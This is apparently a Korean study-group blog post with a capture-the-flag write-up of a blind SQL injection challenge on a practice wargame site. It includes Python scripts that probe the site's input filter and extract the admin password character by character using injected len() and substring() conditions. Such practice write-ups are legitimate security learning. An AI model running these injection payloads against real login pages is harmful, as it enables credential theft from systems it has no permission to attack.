---
layout: default
title: Day25
nav_order: 4

parent: Hacking Project - W4
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다
-----

# > http://suninatas.com/

Web문제의 단계가 8번에서 22번으로 뻥튀기 되었는데 바로 blind sql injection이었다.  
dreamhack과 구글링을 이용해서 시도해보았다.

## challenge 22

![image-20220512163438440](../img/image-20220512163438440.png)

장르는 소개되어 있다시피 블라인드 인젝션이고 필터링을 적용 시킨 듯 하다. 필터링이 될 경우에는 "No hack" 이 출력되고, 로그인이 실패라면 "False", 성공하면 "OK"가 출력된다. 어떤 식으로 필터링이 되는지는 모르겠지만 위에 적힌 단어 이외에도 대부분이 필터링된다. 
"No hack" 이 뜨는 것을 기준으로 필터링이 되는 것을 알아보면

`(`,`and`,`||`,`=` ,`^`, ... 

몇 개 시도를 안 해봤지만 노가다 성이 짙어 보여 가능한 기호들이 무엇이 있는지 파이썬을 이용해서 알아보기로 했다.

```python
import requests

def request(uid,upw):
	url = f'http://suninatas.com/challenge/web22/web22.asp?id={uid}&pw={upw}'
	response = requests.get(url)
	return response


for i in range(33,128):
	uid = 'guest'
	upw = chr(i)
	response = request(uid,upw)
	if "No hack" not in response.text:
		print(chr(i),end=' / ')

print('\n')
```

아래는 결과 캡쳐이다.

![image-20220512172545181](../img/image-20220512172545181.png)

해당 결과를 보다가 `&`가 안되는데 된다고 뜨길래 직접 몇 개를 테스트하던 중에 문득 '대소문자 구분은 하나?' 싶어서 테스트를 해봤는데 `select`는 불가능하지만 s가 대문자인 `Select`는 "False"가 뜨는 것으로 보아 가능한 것으로 보인다. 근데 또 생각해보면 결과 값이 쿼리 문에 대한 결과가 아니라서 어떡하나 싶다.

![image-20220512175907046](../img/image-20220512175907046.png)

통신 간격 때문인지 `&` 기호에 대한 응답이 "No hack" 으로 오지 않을 때가 있어서 `sleep()`으로 간격을 두었다. 그리고 곰곰히 생각해봐도 SQL의 함수도 쓸 수가 없는데 도대체 어떡해야 하는 거지? 모르겠다.



<br>



혹시나 소스 코드에 필터링 방법에 대한 힌트가 있는지 보았는데 admin의 비밀번호를 찾아야 한다고 한다. `' or 1=1` 이런 건 안 통하고 sleep함수나 와일드 카드를 쓰라는 것 같은데... 다시 도전이다.

```html
<!-- Hint : guest / guest & Your goal is to find the admin's pw -->
<!-- M@de by 2theT0P -->
```



<br>



진짜 멍청했던 점이 자꾸 비밀번호 란에서 실패를 했는데 아이디 란에 시도를 안 했었다.  `--` 기호가 주석인 점을 기억해서 해봤더니 아래처럼 로그인 자체는 되는데 비밀번호는 모른다. 그리고 아이디 란에서는 대소문자 구분이 있어서 select 문이 불가능하다.

![image-20220512181053554](../img/image-20220512181053554.png)

그럼 어떤 식으로 진행해야 할지 생각하다가 `len()`과 같은 함수들을 이용해서 하나 하나 조각을 맞춰 보기로 했다. 아 그리고 위의 삽질에서 비밀번호를 대상으로만 확인을 했었기에 아이디에도 확인해보았더니

![image-20220512182748231](../img/image-20220512182748231.png)

`(` 기호가 가능해서 함수들을 사용할 수 있다는 점도 인지한 상태이다. 개발 단계에서 mysql을 써봤기에 몇몇 함수들을 알고 있고 `len()`과 `substr()`을 이용하면 되지 않을까 싶다.



<br>

먼저 비밀번호의 길이부터 찾았다.  비밀번호의 칼럼명은 소스 코드에서 주어진 name이`pw`길래 게싱.

```python
import requests

def request(uid):
	url = f'http://suninatas.com/challenge/web22/web22.asp?id={uid}&pw=1234'
	response = requests.get(url)
	return response

def find_len_pw():
	for num in range(1,30):
		uid = f'admin\' and len(pw)>{num}--'
		response = request(uid)
		if "False" in response.text:
			print("Finally I can get pw len: ",num)
			break

if __name__ == "__main__":
	find_len_pw()
```

결과를 보면 10 자리라고 한다.

![image-20220512183614730](../img/image-20220512183614730.png)

다음은 비밀번호를 찾아야 하는데 문자열의 특정 문자만 선택하는 `substr`을 이용해야 겠다.



<br>

아주 큰 문제가 생겼는데 아무리 코드를 돌려도 한 글자도 맞추지 못했다. 쿼리문에 대한 결과문은 "False"로 나와서 필터링에 걸리지는 않는데 아무래도 어딘가 문제가 있다.

찾아보니 `substr`이 아닌 `substring`을 쓰는 DBMS가 있었다. `mssql` 이라고 하는데 이 녀석도 주석을 `--` 로 쓴다.
{: .text-red-000}

일단 1차적으로 함수가 문제였고 2차적으로 문자열 인덱싱에서 0번이 시작이 아니였다.
{: .text-red-000}



<br>



python으로 항상 `from pwn import *`을 가장 많이 썼었는데 최근 들어 `import request`를 더 많이 써보는 것 같다. 안 될 때마다 갈아 엎었더니 너무 시간이 오래 걸렸다.

```python
import requests

def request(uid):
	url = f'http://suninatas.com/challenge/web22/web22.asp?id={uid}&pw=1234'
	response = requests.get(url)
	return response

def find_len_pw():
	for num in range(1,30):
		uid = f'admin\' and len(pw)>{num}--'
		response = request(uid)
		if "False" in response.text:
			print("Finally I can get pw len: ",num)
			break
	return num

def solve(len_pw):
	
	res = ""
	for idx in range(1,len_pw+1):
		for i in range(33,127):
			uid = f'admin\' and substring(pw,{idx},1) = \''+chr(i)+'\'--'
			response = request(uid)
			if "OK" in response.text:
				print(f"Wait! I find {idx}'s letter : ",chr(i))
				res += chr(i)
				break
	print(res)

if __name__ == "__main__":
	len_pw = find_len_pw()
	solve(len_pw)
```



결국에 이렇게 풀어버렸다~!

![image-20220512185835110](../img/image-20220512185835110.png)

<br>
<br>
<br>

-----
# > 한번 알아보았습니다.

이번 챌린지를 풀다가 `sqlmap`이라는 툴을 발견했다.  
파이썬으로 만들어진 이 툴은 공격 웹사이트에 존재하는 DB 정보를 얻어낼 수 있었다.  
추후 기회가 되면 직접 써봐야겠다.